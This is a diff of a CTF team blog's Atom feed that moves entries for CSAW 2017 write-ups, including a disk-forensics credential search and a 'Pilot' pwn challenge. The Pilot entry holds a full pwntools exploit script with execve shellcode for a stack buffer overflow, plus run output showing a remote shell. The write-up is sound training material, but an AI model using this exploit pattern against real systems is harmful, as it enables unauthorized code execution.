@@ -156,42 +156,6 @@
   </entry>
   
   <entry>
-    <title>[Forensics] CSAW - Best Router</title>
-    <link href="https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/"/>
-    <id>https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/</id>
-    <published>2017-09-19T09:34:16.000Z</published>
-    <updated>2017-09-26T19:18:07.658Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><br>    Best Router<br>    <a href="http://forensics.chal.csaw.io:3287" target="_blank" rel="external">http://forensics.chal.csaw.io:3287</a><br>    NOTE: This will expand to ~16GB!<br>    19:00 Eastern: updated. Old flags have been removed.<br></blockquote>
-
-<p>Forensics challenge we have an img with 16GB, and an online service at <a href="http://forensics.chal.csaw.io:3287" target="_blank" rel="external">http://forensics.chal.csaw.io:3287</a>, the service asks for a username and a password so we guessed we need to find them in the img, so lets use autopsy to search in the linux filesystem for filenames that contain the word flag:<br><a data-fancybox="gallery" href="https://i.imgur.com/WBkVL6L.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/WBkVL6L.png" alt=""><br></a></p>
-<p>As we can see we can found a <code>/var/www/flag.txt</code> unfortunately the file is empty, but we have the files of the web service of the link provided!<br><a data-fancybox="gallery" href="https://i.imgur.com/21qqjhh.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/21qqjhh.png" alt=""><br></a></p>
-<p>Checking the username.txt and password.txt we can see that we have the username and password!<br><a data-fancybox="gallery" href="https://i.imgur.com/xCDzRDG.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/xCDzRDG.png" alt=""><br></a><br><a data-fancybox="gallery" href="https://i.imgur.com/ur0yCl6.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/ur0yCl6.png" alt=""><br></a></p>
-<p>After using the credentials on the web page we got the flag!<br><a data-fancybox="gallery" href="https://i.imgur.com/b46URKw.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/b46URKw.png" alt=""><br></a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;&lt;br&gt;    Best Router&lt;br&gt;    &lt;a href=&quot;http://forensics.chal.csaw.io:3287&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://forensics.chal.csa
-    
-    </summary>
-    
-      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
-    
-    
-      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
-    
-      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
-    
-      <category term="partitions" scheme="https://teamrocketist.github.io/tags/partitions/"/>
-    
-      <category term="disk" scheme="https://teamrocketist.github.io/tags/disk/"/>
-    
-      <category term="autopsy" scheme="https://teamrocketist.github.io/tags/autopsy/"/>
-    
-  </entry>
-  
-  <entry>
     <title>[Forensics] CSAW - Missed Registration</title>
     <link href="https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Missed-Registration/"/>
     <id>https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Missed-Registration/</id>
@@ -230,11 +194,47 @@
   </entry>
   
   <entry>
+    <title>[Forensics] CSAW - Best Router</title>
+    <link href="https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/"/>
+    <id>https://teamrocketist.github.io/2017/09/19/Forensics-CSAW-Best-Router/</id>
+    <published>2017-09-19T09:34:16.000Z</published>
+    <updated>2017-09-26T19:18:07.658Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><br>    Best Router<br>    <a href="http://forensics.chal.csaw.io:3287" target="_blank" rel="external">http://forensics.chal.csaw.io:3287</a><br>    NOTE: This will expand to ~16GB!<br>    19:00 Eastern: updated. Old flags have been removed.<br></blockquote>
+
+<p>Forensics challenge we have an img with 16GB, and an online service at <a href="http://forensics.chal.csaw.io:3287" target="_blank" rel="external">http://forensics.chal.csaw.io:3287</a>, the service asks for a username and a password so we guessed we need to find them in the img, so lets use autopsy to search in the linux filesystem for filenames that contain the word flag:<br><a data-fancybox="gallery" href="https://i.imgur.com/WBkVL6L.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/WBkVL6L.png" alt=""><br></a></p>
+<p>As we can see we can found a <code>/var/www/flag.txt</code> unfortunately the file is empty, but we have the files of the web service of the link provided!<br><a data-fancybox="gallery" href="https://i.imgur.com/21qqjhh.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/21qqjhh.png" alt=""><br></a></p>
+<p>Checking the username.txt and password.txt we can see that we have the username and password!<br><a data-fancybox="gallery" href="https://i.imgur.com/xCDzRDG.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/xCDzRDG.png" alt=""><br></a><br><a data-fancybox="gallery" href="https://i.imgur.com/ur0yCl6.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/ur0yCl6.png" alt=""><br></a></p>
+<p>After using the credentials on the web page we got the flag!<br><a data-fancybox="gallery" href="https://i.imgur.com/b46URKw.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/b46URKw.png" alt=""><br></a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;&lt;br&gt;    Best Router&lt;br&gt;    &lt;a href=&quot;http://forensics.chal.csaw.io:3287&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://forensics.chal.csa
+    
+    </summary>
+    
+      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
+    
+    
+      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
+    
+      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
+    
+      <category term="partitions" scheme="https://teamrocketist.github.io/tags/partitions/"/>
+    
+      <category term="disk" scheme="https://teamrocketist.github.io/tags/disk/"/>
+    
+      <category term="autopsy" scheme="https://teamrocketist.github.io/tags/autopsy/"/>
+    
+  </entry>
+  
+  <entry>
     <title>[Pwn] CSAW - Pilot</title>
     <link href="https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/"/>
     <id>https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/</id>
     <published>2017-09-18T20:58:25.000Z</published>
-    <updated>2017-09-19T05:21:16.086Z</updated>
+    <updated>2017-09-26T20:45:17.516Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>pilot<br><br>Can I take your order?<br><br>nc pwn.chal.csaw.io 8464<br><br>16:05 Eastern: Updated binary<br><br></blockquote>
 
@@ -249,7 +249,7 @@
 <p>The offset is 40 bytes to overflow the code is very simple</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'pwn/pilot'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'pwn.chal.csaw.io'</span>, <span class="number">8464</span>)</div><div class="line"> </div><div class="line">binary = ELF(<span class="string">'pwn/pilot'</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line">r = getConn()</div><div class="line"><span class="comment">#db.attach(r, '''</span></div><div class="line"><span class="comment">#break *0x0000000000400b35</span></div><div class="line"><span class="comment">#c''')</span></div><div class="line">r.recvuntil(<span class="string">'[*]Good Luck Pilot!....\n'</span>)</div><div class="line"></div><div class="line">nops = <span class="string">'\x90'</span>*<span class="number">4</span></div><div class="line">shellcode =  <span class="string">"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"</span></div><div class="line">padding = <span class="string">'A'</span>* (<span class="number">40</span> - len(nops)- len(shellcode)) </div><div class="line">BUFFER = int(r.recvline()[<span class="number">12</span>:],<span class="number">0</span>)</div><div class="line">log.info(<span class="string">"LEAKED BUFFER 0x%x"</span> % BUFFER)</div><div class="line"></div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'[*]Command:'</span>)</div><div class="line">r.sendline(nops+ shellcode + padding+ p64(BUFFER))</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
 <p>Running it</p>
-<figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$ python pilot.py</div><div class="line">(.venvp) evilgod@Debian ~/D/H/c/csaw&gt; python pilot.py</div><div class="line">[*] <span class="string">'~/ctf/csaw/pwn/pilot'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">[+] Opening connection to pwn.chal.csaw.io on port 8464: Done</div><div class="line">[*] LEAKED BUFFER 0x7ffc2562d050</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">pilot</div><div class="line">$ cat flag</div><div class="line">flag&#123;1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&#125;</div></pre></td></tr></table></figure>]]></content>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ python pilot.py</div><div class="line">[*] <span class="string">'~/ctf/csaw/pwn/pilot'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">[+] Opening connection to pwn.chal.csaw.io on port 8464: Done</div><div class="line">[*] LEAKED BUFFER 0x7ffc2562d050</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">pilot</div><div class="line">$ cat flag</div><div class="line">flag&#123;1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&#125;</div></pre></td></tr></table></figure>]]></content>
     
     <summary type="html">
     
@@ -309,11 +309,11 @@
     
       <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
     
-      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
-    
       <category term="aes" scheme="https://teamrocketist.github.io/tags/aes/"/>
     
       <category term="ecb" scheme="https://teamrocketist.github.io/tags/ecb/"/>
+    
+      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
   </entry>
   
@@ -351,9 +351,9 @@
     
       <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
     
-      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
-    
       <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
+    
+      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
     
   </entry>
   
